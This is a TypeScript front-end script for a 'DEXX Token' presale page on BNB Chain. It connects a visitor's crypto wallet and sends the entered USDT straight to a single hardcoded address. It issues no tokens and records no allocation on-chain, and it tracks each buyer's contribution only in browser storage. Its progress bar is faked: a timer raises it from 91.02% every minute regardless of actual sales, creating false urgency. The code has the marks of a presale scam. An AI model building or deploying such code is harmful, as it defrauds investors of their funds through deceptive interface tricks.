// @ts-nocheck

interface Config {
    BNB_CHAIN_ID: number;
    BNB_CHAIN_NAME: string;
    USDT_CONTRACT: string;
    RECEIVER_ADDRESS: string;
    PRESALE_PRICE: number;
    MIN_PURCHASE: number;
    INITIAL_PROGRESS: number;
    PROGRESS_INCREMENT: number;
    PROGRESS_INTERVAL: number;
    PROGRESS_START_TIME: number;
    DEADLINE: number;
    BNB_RPC_URL: string;
}

interface State {
    provider: any;
    signer: any;
    account: string | null;
    chainId: number | null;
    usdtContract: any;
    language: string;
    progress: number;
    progressInterval: any;
    walletProvider: WalletProvider | null;
}

interface Translations {
    [key: string]: {
        [key: string]: string;
    };
}

interface WalletProvider {
    request: (args: any) => Promise<any>;
    on?: (event: string, callback: (...args: any[]) => void) => void;
    isMetaMask?: boolean;
    isOKExWallet?: boolean;
    isBitget?: boolean;
}

interface EthersLib {
    BrowserProvider: any;
    Contract: any;
    formatUnits: (value: any, decimals: number) => string;
    parseUnits: (value: string, decimals: number) => any;
}

declare global {
    interface Window {
        ethereum?: WalletProvider;
        okxwallet?: WalletProvider;
        bitget?: WalletProvider | { ethereum?: WalletProvider; providers?: { ethereum?: WalletProvider } };
        tokenpocket?: WalletProvider | { ethereum?: WalletProvider };
        trustwallet?: WalletProvider | { ethereum?: WalletProvider };
        rainbow?: WalletProvider | { ethereum?: WalletProvider };
        coinbaseWalletExtension?: WalletProvider;
        ethers?: EthersLib;
    }
}

const CONFIG: Config = {
    BNB_CHAIN_ID: 56,
    BNB_CHAIN_NAME: 'BNB Smart Chain',
    USDT_CONTRACT: '0x55d398326f99059fF775485246999027B3197955',
    RECEIVER_ADDRESS: '0x667461231C03d7f1fc665B929a3cc49BD94C1359',
    PRESALE_PRICE: 0.01,
    MIN_PURCHASE: 500,
    INITIAL_PROGRESS: 91.02,
    PROGRESS_INCREMENT: 0.01,
    PROGRESS_INTERVAL: 60 * 1000,
    PROGRESS_START_TIME: new Date('2026-01-28T04:25:00Z').getTime(),
    DEADLINE: new Date('2026-02-28T23:59:59').getTime(),
    BNB_RPC_URL: 'https://bsc-dataseed1.binance.org/'
};

let state: State = {
    provider: null,
    signer: null,
    account: null,
    chainId: null,
    usdtContract: null,
    language: localStorage.getItem('language') || 'zh',
    progress: parseFloat(localStorage.getItem('presaleProgress') || CONFIG.INITIAL_PROGRESS.toString()),
    progressInterval: null,
    walletProvider: null
};

const USDT_ABI: string[] = [
    "function balanceOf(address owner) view returns (uint256)",
    "function transfer(address to, uint256 amount) returns (bool)",
    "function decimals() view returns (uint8)",
    "function symbol() view returns (string)",
    "function allowance(address owner, address spender) view returns (uint256)",
    "function approve(address spender, uint256 amount) returns (bool)"
];

const translations: Translations = {
    zh: {
        connectWallet: '连接钱包',
        disconnect: '断开连接',
        heroTitle: 'DEXX Token 预售',
        heroSubtitle: '加入去中心化 AI 交易的未来',
        presaleTitle: '预售进度',
        deadline: '截止: ',
        progress: '进度',
        totalSupply: '总发行量',
        presalePrice: '预售价格',
        minPurchase: '最低购买',
        yourParticipation: '您的参与',
        totalContributed: '已参与总额：',
        enterAmount: '输入金额 (USDT)',
        max: '最大',
        minAmount: '最低：500 USDT',
        youWillReceive: '您将获得：',
        participate: '参与预售',
        participateAgain: '再次参与',
        privateSale: '私募 & 天使轮',
        publicSale: '公募 / IDO',
        team: '团队 & 创始人',
        advisors: '顾问 & 合作伙伴',
        rewards: '奖励 & 社区激励',
        liquidity: '流动性 & 做市',
        ecosystem: '生态基金',
        tokenomics: '代币经济学',
        tokenUtility: '代币用途',
        utility1: 'DEX/CEX 交易手续费折扣',
        utility2: 'LP 奖励 & Staking 奖励',
        utility3: '平台治理（DAO 投票权）',
        utility4: '优先参与新项目 Launchpad/IDO',
        utility5: '空投 & 社区激励',
        twitter: 'Twitter',
        telegram: 'Telegram',
        footerText: '© 2025 DEXX. 保留所有权利。',
        connecting: '连接中...',
        wrongChain: '请切换到 BNB Chain',
        switchingChain: '正在切换链...',
        insufficientBalance: 'USDT 余额不足',
        transactionPending: '交易处理中...',
        transactionSuccess: '交易成功！',
        transactionFailed: '交易失败',
        pleaseConnectWallet: '请先连接钱包',
        invalidAmount: '请输入有效金额（最低 500 USDT）',
        calculating: '计算中...',
        days: '天',
        hours: '小时',
        minutes: '分钟',
        seconds: '秒',
        expired: '预售已结束',
        timeRemaining: '剩余时间',
        partners: '合作伙伴',
        partnersSubtitle: '值得信赖的合作平台'
    },
    en: {
        connectWallet: 'Connect Wallet',
        disconnect: 'Disconnect',
        heroTitle: 'DEXX Token Presale',
        heroSubtitle: 'Join the future of decentralized AI trading',
        presaleTitle: 'Presale Progress',
        deadline: 'Deadline: ',
        progress: 'Progress',
        totalSupply: 'Total Supply',
        presalePrice: 'Presale Price',
        minPurchase: 'Min Purchase',
        yourParticipation: 'Your Participation',
        totalContributed: 'Total Contributed: ',
        enterAmount: 'Enter Amount (USDT)',
        max: 'MAX',
        minAmount: 'Minimum: 500 USDT',
        youWillReceive: 'You will receive: ',
        participate: 'Participate in Presale',
        participateAgain: 'Participate Again',
        privateSale: 'Private Sale & Angel',
        publicSale: 'Public Sale / IDO',
        team: 'Team & Founders',
        advisors: 'Advisors & Partners',
        rewards: 'Rewards & Community',
        liquidity: 'Liquidity & Market Making',
        ecosystem: 'Ecosystem Fund',
        tokenomics: 'Tokenomics',
        tokenUtility: 'Token Utility',
        utility1: 'Trading fee discounts on DEX/CEX',
        utility2: 'LP rewards & Staking rewards',
        utility3: 'Platform governance (DAO voting rights)',
        utility4: 'Priority access to new project Launchpad/IDO',
        utility5: 'Airdrops & community incentives',
        twitter: 'Twitter',
        telegram: 'Telegram',
        footerText: '© 2025 DEXX. All rights reserved.',
        connecting: 'Connecting...',
        wrongChain: 'Please switch to BNB Chain',
        switchingChain: 'Switching chain...',
        insufficientBalance: 'Insufficient USDT balance',
        transactionPending: 'Transaction pending...',
        transactionSuccess: 'Transaction successful!',
        transactionFailed: 'Transaction failed',
        pleaseConnectWallet: 'Please connect wallet first',
        invalidAmount: 'Please enter a valid amount (minimum 500 USDT)',
        calculating: 'Calculating...',
        days: 'd',
        hours: 'h',
        minutes: 'm',
        seconds: 's',
        expired: 'Presale has ended',
        timeRemaining: 'Time Remaining',
        partners: 'Partners',
        partnersSubtitle: 'Trusted by leading platforms'
    }
};

function initializeApp(): void {
    if (typeof window.ethers === 'undefined') {
        console.warn('ethers.js not loaded yet, waiting...');
        setTimeout(initializeApp, 100);
        return;
    }
    
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
}

initializeApp();

async function init(): Promise<void> {
    setupEventListeners();
    updateLanguage();
    startProgressTimer();
    
    setTimeout(() => {
        checkWalletConnection();
    }, 500);
    
    let checkCount = 0;
    const maxChecks = 10;
    const walletCheckInterval = setInterval(() => {
        checkCount++;
        const provider = getWalletProvider();
        if (provider || checkCount >= maxChecks) {
            clearInterval(walletCheckInterval);
            if (provider && !state.account) {
                checkWalletConnection();
            }
        }
    }, 500);
}

function setupEventListeners(): void {
    const langToggle = document.getElementById('langToggle');
    const connectWalletBtn = document.getElementById('connectWalletBtn');
    const disconnectWalletBtn = document.getElementById('disconnectWalletBtn');
    const purchaseAmount = document.getElementById('purchaseAmount');
    const maxBtn = document.getElementById('maxBtn');
    const participateBtn = document.getElementById('participateBtn');
    const participateAgainBtn = document.getElementById('participateAgainBtn');
    
    if (langToggle) langToggle.addEventListener('click', toggleLanguage);
    if (connectWalletBtn) connectWalletBtn.addEventListener('click', connectWallet);
    if (disconnectWalletBtn) disconnectWalletBtn.addEventListener('click', disconnectWallet);
    if (purchaseAmount) purchaseAmount.addEventListener('input', updateEstimatedTokens);
    if (maxBtn) maxBtn.addEventListener('click', setMaxAmount);
    if (participateBtn) participateBtn.addEventListener('click', participateInPresale);
    if (participateAgainBtn) participateAgainBtn.addEventListener('click', () => {
        const purchaseAmountInput = document.getElementById('purchaseAmount');
        if (purchaseAmountInput) purchaseAmountInput.value = '';
        const participateAgainBtnEl = document.getElementById('participateAgainBtn');
        const participateBtnEl = document.getElementById('participateBtn');
        const transactionStatus = document.getElementById('transactionStatus');
        if (participateAgainBtnEl) participateAgainBtnEl.style.display = 'none';
        if (participateBtnEl) participateBtnEl.style.display = 'block';
        if (transactionStatus) transactionStatus.style.display = 'none';
        updateEstimatedTokens();
    });
}

function toggleLanguage(): void {
    state.language = state.language === 'zh' ? 'en' : 'zh';
    localStorage.setItem('language', state.language);
    updateLanguage();
}

function updateLanguage(): void {
    const lang = state.language;
    const elements = document.querySelectorAll('[data-i18n]');
    
    elements.forEach((element) => {
        const key = element.getAttribute('data-i18n');
        if (key && translations[lang][key]) {
            if (element.tagName === 'INPUT' && (element as HTMLInputElement).placeholder) {
                (element as HTMLInputElement).placeholder = translations[lang][key];
            } else {
                element.textContent = translations[lang][key];
            }
        }
    });
    
    const langToggle = document.getElementById('langToggle');
    if (langToggle) langToggle.textContent = lang === 'zh' ? 'EN' : '中文';
    
    if (state.account) {
        updateWalletInfo();
    }
    
    updateUserParticipation();
}

function getWalletProvider(): WalletProvider | null {
    if (typeof window.ethereum !== 'undefined') {
        return window.ethereum;
    }
    
    if (typeof window.okxwallet !== 'undefined' && window.okxwallet) {
        return window.okxwallet;
    }
    
    if (typeof window.bitget !== 'undefined' && window.bitget) {
        if ((window.bitget as any).ethereum) {
            return (window.bitget as any).ethereum;
        }
        if ((window.bitget as any).providers && (window.bitget as any).providers.ethereum) {
            return (window.bitget as any).providers.ethereum;
        }
        return window.bitget as WalletProvider;
    }
    
    if (typeof window.tokenpocket !== 'undefined' && window.tokenpocket) {
        if ((window.tokenpocket as any).ethereum) {
            return (window.tokenpocket as any).ethereum;
        }
        return window.tokenpocket as WalletProvider;
    }
    
    if (typeof window.trustwallet !== 'undefined' && window.trustwallet) {
        if ((window.trustwallet as any).ethereum) {
            return (window.trustwallet as any).ethereum;
        }
        return window.trustwallet as WalletProvider;
    }
    
    if (typeof window.rainbow !== 'undefined' && window.rainbow) {
        if ((window.rainbow as any).ethereum) {
            return (window.rainbow as any).ethereum;
        }
        return window.rainbow as WalletProvider;
    }
    
    if (typeof window.coinbaseWalletExtension !== 'undefined') {
        return window.coinbaseWalletExtension;
    }
    
    return null;
}

async function waitForWallet(timeout = 3000): Promise<WalletProvider | null> {
    const startTime = Date.now();
    
    while (Date.now() - startTime < timeout) {
        const provider = getWalletProvider();
        if (provider) {
            return provider;
        }
        await new Promise(resolve => setTimeout(resolve, 100));
    }
    
    return null;
}

async function checkWalletConnection(): Promise<void> {
    const provider = await waitForWallet(2000);
    if (provider) {
        try {
            const tempProvider = new window.ethers.BrowserProvider(provider);
            const accounts = await tempProvider.listAccounts();
            if (accounts.length > 0) {
                await connectWallet();
            }
        } catch (error) {
            console.error('Error checking wallet connection:', error);
        }
    }
}

async function connectWallet(): Promise<void> {
    try {
        let provider = getWalletProvider();
        
        console.log('Wallet detection:', {
            hasEthereum: typeof window.ethereum !== 'undefined',
            hasOkxwallet: typeof window.okxwallet !== 'undefined',
            hasBitget: typeof window.bitget !== 'undefined',
            hasTokenpocket: typeof window.tokenpocket !== 'undefined',
            hasTrustwallet: typeof window.trustwallet !== 'undefined',
            ethereumIsMetaMask: window.ethereum?.isMetaMask,
            ethereumIsOKEx: window.ethereum?.isOKExWallet,
            ethereumIsBitget: window.ethereum?.isBitget,
            provider: provider ? 'Found' : 'Not found'
        });
        
        if (!provider) {
            console.log('Waiting for wallet injection...');
            provider = await waitForWallet(3000);
        }
        
        if (!provider) {
            const detectedWallets: string[] = [];
            if (typeof window.ethereum !== 'undefined') detectedWallets.push('window.ethereum');
            if (typeof window.okxwallet !== 'undefined') detectedWallets.push('window.okxwallet');
            if (typeof window.bitget !== 'undefined') detectedWallets.push('window.bitget');
            if (typeof window.tokenpocket !== 'undefined') detectedWallets.push('window.tokenpocket');
            
            const errorMsg = state.language === 'zh' 
                ? `未检测到可用的钱包扩展。\n\n检测到的对象: ${detectedWallets.length > 0 ? detectedWallets.join(', ') : '无'}\n\n请确保已安装并启用以下钱包之一：\n• MetaMask\n• OKX Wallet\n• Bitget Wallet\n• TP Wallet (TokenPocket)\n• Coinbase Wallet\n\n安装后请刷新页面。` 
                : `No usable wallet extension detected.\n\nDetected objects: ${detectedWallets.length > 0 ? detectedWallets.join(', ') : 'None'}\n\nPlease make sure one of the following wallets is installed and enabled:\n• MetaMask\n• OKX Wallet\n• Bitget Wallet\n• TP Wallet (TokenPocket)\n• Coinbase Wallet\n\nPlease refresh the page after installation.`;
            alert(errorMsg);
            
            const walletKeys = Object.keys(window).filter(key => 
                key.toLowerCase().includes('wallet') || 
                key.toLowerCase().includes('ethereum') ||
                key.toLowerCase().includes('okx') ||
                key.toLowerCase().includes('bitget') ||
                key.toLowerCase().includes('tokenpocket') ||
                key.toLowerCase().includes('trust') ||
                key.toLowerCase().includes('coinbase')
            );
            console.log('Wallet-related window properties:', walletKeys);
            console.log('window.ethereum:', window.ethereum);
            return;
        }
        
        console.log('Wallet provider found:', provider);

        if (typeof window.ethers === 'undefined') {
            throw new Error('ethers.js library is not loaded. Please refresh the page.');
        }
        
        state.provider = new window.ethers.BrowserProvider(provider);
        
        await state.provider.send("eth_requestAccounts", []);
        const accounts = await state.provider.listAccounts();
        
        if (accounts.length === 0) {
            return;
        }
        
        state.account = accounts[0].address;
        
        state.signer = await state.provider.getSigner();
        
        state.walletProvider = provider;

        await checkAndSwitchChain();

        setupWalletEventListeners();

        await updateWalletInfo();
        await loadUserParticipation();

    } catch (error: any) {
        console.error('Error connecting wallet:', error);
        if (error.code === 4001) {
            alert(state.language === 'zh' ? '用户拒绝了连接请求' : 'User rejected the connection request');
        } else {
            alert(state.language === 'zh' ? '连接钱包失败：' + error.message : 'Failed to connect wallet: ' + error.message);
        }
    }
}

async function checkAndSwitchChain(): Promise<void> {
    try {
        const network = await state.provider.getNetwork();
        state.chainId = Number(network.chainId);

        if (state.chainId !== CONFIG.BNB_CHAIN_ID) {
            await switchToBNBChain();
        }
    } catch (error) {
        console.error('Error checking chain:', error);
    }
}

async function switchToBNBChain(): Promise<void> {
    try {
        const provider = state.walletProvider || getWalletProvider();
        if (!provider) {
            throw new Error('No wallet provider available');
        }
        
        const chainIdHex = '0x' + CONFIG.BNB_CHAIN_ID.toString(16);
        
        try {
            await provider.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: chainIdHex }],
            });
        } catch (switchError: any) {
            if (switchError.code === 4902) {
                await provider.request({
                    method: 'wallet_addEthereumChain',
                    params: [{
                        chainId: chainIdHex,
                        chainName: CONFIG.BNB_CHAIN_NAME,
                        nativeCurrency: {
                            name: 'BNB',
                            symbol: 'BNB',
                            decimals: 18
                        },
                        rpcUrls: [CONFIG.BNB_RPC_URL],
                        blockExplorerUrls: ['https://bscscan.com']
                    }],
                });
            } else {
                throw switchError;
            }
        }

        await new Promise(resolve => setTimeout(resolve, 1000));
        
        const network = await state.provider.getNetwork();
        state.chainId = Number(network.chainId);
        
        if (state.chainId !== CONFIG.BNB_CHAIN_ID) {
            throw new Error('Failed to switch to BNB Chain');
        }

    } catch (error) {
        console.error('Error switching chain:', error);
        alert(state.language === 'zh' ? '请手动切换到 BNB Chain' : 'Please manually switch to BNB Chain');
        throw error;
    }
}

function setupWalletEventListeners(): void {
    if (!state.walletProvider) return;
    
    if (state.walletProvider.on) {
        state.walletProvider.on('accountsChanged', async (accounts: string[]) => {
            if (accounts.length === 0) {
                disconnectWallet();
            } else {
                state.account = accounts[0];
                state.signer = await state.provider.getSigner();
                await updateWalletInfo();
                await loadUserParticipation();
            }
        });

        state.walletProvider.on('chainChanged', async (chainId: string | number) => {
            if (typeof chainId === 'string') {
                state.chainId = parseInt(chainId, 16);
            } else {
                state.chainId = Number(chainId);
            }
            
            if (state.chainId !== CONFIG.BNB_CHAIN_ID) {
                alert(state.language === 'zh' ? '请切换到 BNB Chain' : 'Please switch to BNB Chain');
                await checkAndSwitchChain();
            }
            await updateWalletInfo();
        });

        state.walletProvider.on('disconnect', () => {
            disconnectWallet();
        });
    }
}

async function updateWalletInfo(): Promise<void> {
    if (!state.account || !state.provider) {
        const connectWalletBtn = document.getElementById('connectWalletBtn');
        const walletInfo = document.getElementById('walletInfo');
        if (connectWalletBtn) connectWalletBtn.style.display = 'block';
        if (walletInfo) walletInfo.style.display = 'none';
        return;
    }

    try {
        const walletAddress = document.getElementById('walletAddress');
        const walletBalance = document.getElementById('walletBalance');
        const walletChain = document.getElementById('walletChain');
        const connectWalletBtn = document.getElementById('connectWalletBtn');
        const walletInfo = document.getElementById('walletInfo');
        
        if (walletAddress) {
            walletAddress.textContent = `${state.account.substring(0, 6)}...${state.account.substring(state.account.length - 4)}`;
        }

        const usdtContract = new window.ethers.Contract(CONFIG.USDT_CONTRACT, USDT_ABI, state.provider);
        const balance = await usdtContract.balanceOf(state.account);
        const decimals = await usdtContract.decimals();
        const balanceFormatted = window.ethers.formatUnits(balance, decimals);
        
        if (walletBalance) {
            walletBalance.textContent = `${parseFloat(balanceFormatted).toFixed(2)} USDT`;
        }
        
        if (walletChain) {
            walletChain.textContent = state.chainId === CONFIG.BNB_CHAIN_ID ? 'BNB Chain' : `Chain ID: ${state.chainId}`;
        }
        
        if (connectWalletBtn) connectWalletBtn.style.display = 'none';
        if (walletInfo) walletInfo.style.display = 'flex';
        
        const participateBtn = document.getElementById('participateBtn') as HTMLButtonElement;
        const participateAgainBtn = document.getElementById('participateAgainBtn') as HTMLButtonElement;
        const purchaseAmount = document.getElementById('purchaseAmount');
        
        if (participateBtn && participateBtn.style.display !== 'none') {
            const amount = parseFloat((purchaseAmount as HTMLInputElement)?.value || '0');
            participateBtn.disabled = isNaN(amount) || amount < CONFIG.MIN_PURCHASE;
        }
        
        if (participateAgainBtn && participateAgainBtn.style.display !== 'none') {
            const amount = parseFloat((purchaseAmount as HTMLInputElement)?.value || '0');
            participateAgainBtn.disabled = isNaN(amount) || amount < CONFIG.MIN_PURCHASE;
        }
        
    } catch (error) {
        console.error('Error updating wallet info:', error);
    }
}

async function loadUserParticipation(): Promise<void> {
    const userParticipation = document.getElementById('userParticipation');
    const userContributedAmount = document.getElementById('userContributedAmount');
    
    if (!userParticipation || !userContributedAmount) return;
    
    const contributed = localStorage.getItem(`userContributed_${state.account}`);
    if (contributed) {
        userParticipation.style.display = 'block';
        userContributedAmount.textContent = `${parseFloat(contributed).toFixed(2)} USDT`;
    } else {
        userParticipation.style.display = 'none';
    }
}

function updateUserParticipation(): void {
    const userParticipation = document.getElementById('userParticipation');
    const userContributedAmount = document.getElementById('userContributedAmount');
    
    if (!userParticipation || !userContributedAmount || !state.account) return;
    
    const contributed = localStorage.getItem(`userContributed_${state.account}`);
    if (contributed) {
        userParticipation.style.display = 'block';
        userContributedAmount.textContent = `${parseFloat(contributed).toFixed(2)} USDT`;
    } else {
        userParticipation.style.display = 'none';
    }
}

function disconnectWallet(): void {
    state.account = null;
    state.signer = null;
    state.chainId = null;
    state.usdtContract = null;
    
    const connectWalletBtn = document.getElementById('connectWalletBtn');
    const walletInfo = document.getElementById('walletInfo');
    const userParticipation = document.getElementById('userParticipation');
    
    if (connectWalletBtn) connectWalletBtn.style.display = 'block';
    if (walletInfo) walletInfo.style.display = 'none';
    if (userParticipation) userParticipation.style.display = 'none';
    
    const participateBtn = document.getElementById('participateBtn') as HTMLButtonElement;
    const participateAgainBtn = document.getElementById('participateAgainBtn') as HTMLButtonElement;
    
    if (participateBtn) participateBtn.disabled = true;
    if (participateAgainBtn) participateAgainBtn.disabled = true;
}

function updateEstimatedTokens(): void {
    const amountInput = document.getElementById('purchaseAmount') as HTMLInputElement;
    const estimatedTokens = document.getElementById('estimatedTokens');
    const participateBtn = document.getElementById('participateBtn') as HTMLButtonElement;
    const participateAgainBtn = document.getElementById('participateAgainBtn') as HTMLButtonElement;
    
    if (!amountInput || !estimatedTokens) return;
    
    const amount = parseFloat(amountInput.value);

    if (isNaN(amount) || amount < CONFIG.MIN_PURCHASE) {
        estimatedTokens.textContent = '0 DEXX';
        if (participateBtn && participateBtn.style.display !== 'none') {
            participateBtn.disabled = true;
        }
        if (participateAgainBtn && participateAgainBtn.style.display !== 'none') {
            participateAgainBtn.disabled = true;
        }
        return;
    }

    const tokens = amount / CONFIG.PRESALE_PRICE;
    estimatedTokens.textContent = `${tokens.toLocaleString('en-US', { maximumFractionDigits: 0 })} DEXX`;
    
    if (state.account) {
        if (participateBtn && participateBtn.style.display !== 'none') {
            participateBtn.disabled = false;
        }
        if (participateAgainBtn && participateAgainBtn.style.display !== 'none') {
            participateAgainBtn.disabled = false;
        }
    }
}

async function setMaxAmount(): Promise<void> {
    if (!state.account || !state.provider) {
        alert(translations[state.language].pleaseConnectWallet);
        return;
    }

    try {
        const usdtContract = new window.ethers.Contract(CONFIG.USDT_CONTRACT, USDT_ABI, state.provider);
        const balance = await usdtContract.balanceOf(state.account);
        const decimals = await usdtContract.decimals();
        const balanceFormatted = window.ethers.formatUnits(balance, decimals);
        
        const purchaseAmount = document.getElementById('purchaseAmount') as HTMLInputElement;
        if (purchaseAmount) {
            purchaseAmount.value = balanceFormatted;
            updateEstimatedTokens();
        }
    } catch (error) {
        console.error('Error getting max amount:', error);
    }
}

async function participateInPresale(): Promise<void> {
    if (!state.account || !state.signer) {
        alert(translations[state.language].pleaseConnectWallet);
        return;
    }

    const purchaseAmount = document.getElementById('purchaseAmount') as HTMLInputElement;
    const amount = parseFloat(purchaseAmount?.value || '0');

    if (isNaN(amount) || amount < CONFIG.MIN_PURCHASE) {
        alert(translations[state.language].invalidAmount);
        return;
    }

    const participateBtn = document.getElementById('participateBtn') as HTMLButtonElement;
    const participateAgainBtn = document.getElementById('participateAgainBtn') as HTMLButtonElement;
    const transactionStatus = document.getElementById('transactionStatus');
    const statusMessage = document.getElementById('statusMessage');
    const txHash = document.getElementById('txHash');
    
    if (participateBtn) participateBtn.disabled = true;
    if (participateAgainBtn) participateAgainBtn.disabled = true;
    
    try {
        const usdtContract = new window.ethers.Contract(CONFIG.USDT_CONTRACT, USDT_ABI, state.signer);
        const decimals = await usdtContract.decimals();
        const amountWei = window.ethers.parseUnits(amount.toString(), decimals);
        
        if (transactionStatus) transactionStatus.style.display = 'block';
        if (statusMessage) statusMessage.textContent = translations[state.language].transactionPending;
        
        const tx = await usdtContract.transfer(CONFIG.RECEIVER_ADDRESS, amountWei);
        
        if (txHash) {
            txHash.style.display = 'block';
            txHash.innerHTML = `<a href="https://bscscan.com/tx/${tx.hash}" target="_blank">${tx.hash}</a>`;
        }
        
        await tx.wait();
        
        if (statusMessage) statusMessage.textContent = translations[state.language].transactionSuccess;
        
        const contributed = localStorage.getItem(`userContributed_${state.account}`);
        const totalContributed = contributed ? parseFloat(contributed) + amount : amount;
        localStorage.setItem(`userContributed_${state.account}`, totalContributed.toString());
        
        await loadUserParticipation();
        
        if (participateBtn) {
            participateBtn.style.display = 'none';
        }
        if (participateAgainBtn) {
            participateAgainBtn.style.display = 'block';
            participateAgainBtn.disabled = true;
        }
        
        await updateWalletInfo();
        
    } catch (error: any) {
        console.error('Error participating in presale:', error);
        
        if (statusMessage) statusMessage.textContent = translations[state.language].transactionFailed;
        
        if (participateBtn && participateBtn.style.display !== 'none') {
            participateBtn.disabled = false;
        }
        if (participateAgainBtn && participateAgainBtn.style.display !== 'none') {
            participateAgainBtn.disabled = false;
        }
        
        if (error.code === -32603 || error.message?.includes('insufficient funds')) {
            alert(translations[state.language].insufficientBalance);
        }
    }
}

function startProgressTimer(): void {
    const currentTime = Date.now();
    const elapsedTime = currentTime - CONFIG.PROGRESS_START_TIME;
    
    if (elapsedTime > 0) {
        const elapsedMinutes = Math.floor(elapsedTime / CONFIG.PROGRESS_INTERVAL);
        const calculatedProgress = CONFIG.INITIAL_PROGRESS + (elapsedMinutes * CONFIG.PROGRESS_INCREMENT);
        
        if (calculatedProgress > 100) {
            state.progress = 100;
        } else {
            state.progress = calculatedProgress;
        }
    } else {
        state.progress = CONFIG.INITIAL_PROGRESS;
    }
    
    updateProgressDisplay();
    
    state.progressInterval = setInterval(() => {
        state.progress += CONFIG.PROGRESS_INCREMENT;
        if (state.progress > 100) {
            state.progress = 100;
            clearInterval(state.progressInterval);
        }
        localStorage.setItem('presaleProgress', state.progress.toString());
        updateProgressDisplay();
    }, CONFIG.PROGRESS_INTERVAL);
}

function updateProgressDisplay(): void {
    const progressPercentage = document.getElementById('progressPercentage');
    const progressBar = document.getElementById('progressBar');
    
    if (progressPercentage) {
        const percentage = state.progress.toFixed(2);
        progressPercentage.textContent = `${percentage}%`;
    }
    
    if (progressBar) {
        const percentage = state.progress.toFixed(2);
        progressBar.style.width = `${percentage}%`;
    }
}

function updateDeadlineDisplay(): void {
    const deadlineDate = document.getElementById('deadlineDate');
    if (!deadlineDate) return;
    
    const now = Date.now();
    const timeRemaining = CONFIG.DEADLINE - now;
    
    if (timeRemaining <= 0) {
        deadlineDate.textContent = translations[state.language].expired;
        return;
    }
    
    const days = Math.floor(timeRemaining / (1000 * 60 * 60 * 24));
    const hours = Math.floor((timeRemaining % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    const minutes = Math.floor((timeRemaining % (1000 * 60 * 60)) / (1000 * 60));
    const seconds = Math.floor((timeRemaining % (1000 * 60)) / 1000);
    
    const lang = state.language;
    const deadlineText = translations[lang].deadline;
    const timeText = `${days}${translations[lang].days} ${hours}${translations[lang].hours} ${minutes}${translations[lang].minutes} ${seconds}${translations[lang].seconds}`;
    
    deadlineDate.textContent = timeText;
}

setInterval(updateDeadlineDisplay, 1000);
updateDeadlineDisplay();
